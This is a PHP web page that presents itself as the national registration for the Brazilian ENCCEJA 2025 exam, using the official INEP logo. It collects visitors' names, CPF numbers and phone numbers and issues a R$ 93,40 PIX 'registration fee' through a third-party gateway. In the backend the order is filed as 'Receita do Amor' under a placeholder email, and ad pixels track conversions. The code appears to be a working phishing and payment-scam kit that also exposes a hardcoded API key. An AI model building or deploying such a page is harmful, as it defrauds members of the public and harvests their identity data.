<?php
session_start();

// Configurações WitePay
$WITEPAY_API_KEY = 'wtp_7819b0bb469f4b52a96feca4ddc46ba4';
$GOOGLE_PIXEL_ID = '6859ccee5af20eab22a408ef';
$FACEBOOK_PIXELS = ['1418766538994503', '1345433039826605', '1390026985502891'];

// Função para chamar API WitePay
function callWitePayAPI($endpoint, $data) {
    global $WITEPAY_API_KEY;
    
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => 'https://api.witepay.com.br/v1/' . $endpoint,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => [
            'x-api-key: ' . $WITEPAY_API_KEY,
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_TIMEOUT => 30
    ]);
    
    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    
    if ($httpCode === 200 || $httpCode === 201) {
        return json_decode($response, true);
    }
    
    return false;
}

// Processar formulário de pagamento
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_payment') {
    $nome = $_POST['nome'] ?? '';
    $cpf = preg_replace('/\D/', '', $_POST['cpf'] ?? '');
    $telefone = preg_replace('/\D/', '', $_POST['telefone'] ?? '');
    
    if ($nome && $cpf && $telefone) {
        // Criar pedido WitePay
        $orderData = callWitePayAPI('order/create', [
            'productData' => [[
                'name' => 'Receita do Amor',
                'value' => 9340 // R$ 93,40 em centavos
            ]],
            'clientData' => [
                'clientName' => $nome,
                'clientDocument' => $cpf,
                'clientEmail' => 'gerarpagamentos@gmail.com',
                'clientPhone' => $telefone
            ]
        ]);
        
        if ($orderData && isset($orderData['orderId'])) {
            // Criar cobrança PIX
            $chargeData = callWitePayAPI('charge/create', [
                'orderId' => $orderData['orderId'],
                'paymentMethod' => 'PIX'
            ]);
            
            if ($chargeData && isset($chargeData['pixCode'])) {
                $_SESSION['payment_data'] = [
                    'charge_id' => $chargeData['id'],
                    'pix_code' => $chargeData['pixCode'],
                    'amount' => 93.40,
                    'expires_at' => $chargeData['expiresAt'] ?? null,
                    'nome' => $nome,
                    'cpf' => $cpf
                ];
                
                header('Content-Type: application/json');
                echo json_encode([
                    'success' => true,
                    'id' => $chargeData['id'],
                    'pixCode' => $chargeData['pixCode'],
                    'amount' => 93.40,
                    'expiresAt' => $chargeData['expiresAt'] ?? null
                ]);
                exit;
            }
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Erro ao criar pagamento PIX']);
    exit;
}

// Verificar status do pagamento
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'check_payment') {
    $transactionId = $_POST['transactionId'] ?? '';
    
    if ($transactionId && isset($_SESSION['payment_status_' . $transactionId])) {
        $status = $_SESSION['payment_status_' . $transactionId];
        
        header('Content-Type: application/json');
        echo json_encode([
            'status' => $status['status'],
            'message' => $status['status'] === 'paid' ? 'Pagamento confirmado!' : 'Aguardando confirmação do pagamento'
        ]);
        exit;
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'pending', 'message' => 'Aguardando confirmação do pagamento']);
    exit;
}

// Webhook WitePay
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_GET['webhook'] === 'witepay') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if ($data && isset($data['chargeId']) && isset($data['status'])) {
        $chargeId = $data['chargeId'];
        $status = strtolower($data['status']);
        
        if (in_array($status, ['paid', 'completed', 'approved'])) {
            $_SESSION['payment_status_' . $chargeId] = [
                'status' => 'paid',
                'confirmed_at' => date('Y-m-d H:i:s'),
                'charge_id' => $chargeId
            ];
        }
    }
    
    http_response_code(200);
    echo 'OK';
    exit;
}

// Definir página atual
$page = $_GET['page'] ?? 'home';
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>ENCCEJA 2025 - Inscrição Nacional</title>
    <link rel="stylesheet" href="static/css/output.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/your-fontawesome-kit.js" crossorigin="anonymous"></script>
    
    <!-- Google Pixel -->
    <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','<?php echo $GOOGLE_PIXEL_ID; ?>');
    </script>
    
    <!-- Facebook Pixels -->
    <?php foreach ($FACEBOOK_PIXELS as $pixelId): ?>
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window,document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '<?php echo $pixelId; ?>');
    fbq('track', 'PageView');
    </script>
    <?php endforeach; ?>
</head>
<body class="bg-gray-50">

<?php if ($page === 'home'): ?>
    <!-- Página Inicial -->
    <div class="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
        <div class="container mx-auto px-4 py-8">
            <div class="text-center mb-8">
                <img src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" 
                     alt="ENCCEJA 2025" class="mx-auto h-20 mb-4">
                <h1 class="text-3xl font-bold text-gray-800 mb-2">ENCCEJA 2025</h1>
                <p class="text-lg text-gray-600">Exame Nacional para Certificação de Competências de Jovens e Adultos</p>
            </div>
            
            <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg p-6">
                <h2 class="text-xl font-semibold text-gray-800 mb-4">Iniciar Inscrição</h2>
                <form id="cpfForm" class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">CPF</label>
                        <input type="text" id="cpf" placeholder="000.000.000-00" 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                    </div>
                    <button type="submit" class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 transition duration-200">
                        Continuar Inscrição
                    </button>
                </form>
            </div>
        </div>
    </div>

<?php elseif ($page === 'pagamento'): ?>
    <!-- Página de Pagamento -->
    <div class="min-h-screen bg-gradient-to-br from-green-50 to-emerald-100">
        <div class="container mx-auto px-4 py-8">
            <div class="text-center mb-8">
                <img src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" 
                     alt="ENCCEJA 2025" class="mx-auto h-20 mb-4">
                <h1 class="text-2xl font-bold text-gray-800">Finalizar Inscrição</h1>
            </div>
            
            <div class="max-w-lg mx-auto bg-white rounded-lg shadow-lg p-6">
                <div class="text-center mb-6">
                    <div class="text-3xl font-bold text-green-600">R$ 93,40</div>
                    <p class="text-gray-600">Taxa de Inscrição ENCCEJA 2025</p>
                </div>
                
                <form id="paymentForm" class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Nome Completo</label>
                        <input type="text" id="nome" required 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">CPF</label>
                        <input type="text" id="cpf" placeholder="000.000.000-00" required
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
                        <input type="text" id="telefone" placeholder="(11) 99999-9999" required
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500">
                    </div>
                    <button type="submit" class="w-full bg-green-600 text-white py-3 px-4 rounded-md hover:bg-green-700 transition duration-200 font-semibold">
                        Gerar PIX para Pagamento
                    </button>
                </form>
                
                <!-- Resultado PIX -->
                <div id="pixResult" class="hidden mt-6 p-4 bg-gray-50 rounded-lg">
                    <h3 class="font-semibold text-gray-800 mb-3">Pagamento PIX Gerado</h3>
                    <div class="text-center">
                        <div id="qrcode" class="mb-4"></div>
                        <p class="text-sm text-gray-600 mb-2">Código PIX:</p>
                        <div id="pixCode" class="bg-white p-2 rounded border text-xs break-all mb-4"></div>
                        <button onclick="copyPixCode()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
                            Copiar Código PIX
                        </button>
                    </div>
                    <div id="paymentStatus" class="mt-4 text-center">
                        <p class="text-yellow-600">Aguardando pagamento...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

<?php endif; ?>

<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
<script>
// Máscaras para CPF e telefone
document.getElementById('cpf')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    e.target.value = value;
});

document.getElementById('telefone')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(\d{2})(\d)/, '($1) $2');
    value = value.replace(/(\d{5})(\d)/, '$1-$2');
    e.target.value = value;
});

// Formulário CPF
document.getElementById('cpfForm')?.addEventListener('submit', function(e) {
    e.preventDefault();
    const cpf = document.getElementById('cpf').value;
    if (cpf.length >= 14) {
        window.location.href = '?page=pagamento';
    }
});

// Formulário de pagamento
document.getElementById('paymentForm')?.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = new FormData();
    formData.append('action', 'create_payment');
    formData.append('nome', document.getElementById('nome').value);
    formData.append('cpf', document.getElementById('cpf').value);
    formData.append('telefone', document.getElementById('telefone').value);
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showPixResult(data);
            startPaymentChecking(data.id);
        } else {
            alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
        }
    })
    .catch(error => {
        alert('Erro de conexão. Tente novamente.');
    });
});

function showPixResult(data) {
    const pixResult = document.getElementById('pixResult');
    const pixCode = document.getElementById('pixCode');
    const qrcode = document.getElementById('qrcode');
    
    pixCode.textContent = data.pixCode;
    pixResult.classList.remove('hidden');
    
    // Gerar QR Code
    QRCode.toCanvas(qrcode, data.pixCode, function (error) {
        if (error) console.error(error);
    });
}

function copyPixCode() {
    const pixCode = document.getElementById('pixCode').textContent;
    navigator.clipboard.writeText(pixCode).then(() => {
        alert('Código PIX copiado!');
    });
}

let currentTransactionId = null;

function startPaymentChecking(transactionId) {
    currentTransactionId = transactionId;
    checkPaymentStatus();
}

function checkPaymentStatus() {
    if (!currentTransactionId) return;
    
    const formData = new FormData();
    formData.append('action', 'check_payment');
    formData.append('transactionId', currentTransactionId);
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        const statusDiv = document.getElementById('paymentStatus');
        
        if (data.status === 'paid') {
            statusDiv.innerHTML = '<p class="text-green-600 font-semibold"><i class="fas fa-check-circle"></i> Pagamento confirmado!</p>';
            
            // Trigger conversions
            <?php foreach ($FACEBOOK_PIXELS as $pixelId): ?>
            fbq('track', 'Purchase', {value: 93.40, currency: 'BRL'});
            <?php endforeach; ?>
            
            gtag('event', 'purchase', {
                transaction_id: currentTransactionId,
                value: 93.40,
                currency: 'BRL'
            });
            
        } else {
            setTimeout(checkPaymentStatus, 3000); // Verificar a cada 3 segundos
        }
    })
    .catch(error => {
        setTimeout(checkPaymentStatus, 5000); // Tentar novamente em 5 segundos
    });
}
</script>

</body>
</html>